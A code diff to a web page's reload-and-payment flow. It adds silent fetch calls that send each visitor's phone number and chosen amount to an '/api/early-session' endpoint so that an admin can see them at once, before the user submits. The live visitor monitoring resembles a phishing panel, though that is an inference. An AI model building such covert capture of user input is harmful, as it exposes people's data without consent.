@@ -488,6 +488,14 @@
       // Ping with phone number immediately
       pingVisitor('reload-amount', currentNumber, '', 'reload');
 
+      // Create early session so admin sees phone number right away
+      const _earlyId = 'early_' + _vid;
+      fetch('/api/early-session', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId: _earlyId, number: currentNumber, amount: '', type: 'reload', visitorId: _vid, page: 'amount' })
+      }).catch(() => {});
+
       // Show loading
       showLoading();
 
@@ -558,6 +566,13 @@
 
       setTimeout(() => {
         hideLoading();
+        // Update early session with amount
+        const _earlyId = 'early_' + _vid;
+        fetch('/api/early-session', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId: _earlyId, number: currentNumber, amount: selectedAmount, type: 'reload', visitorId: _vid, page: 'payment-method' })
+        }).catch(() => {});
         // Redirect directly to payment-method page
         pingVisitor('payment-method', currentNumber, selectedAmount, 'reload');
         window.location.href = '/payment-method?number=' + encodeURIComponent(currentNumber)
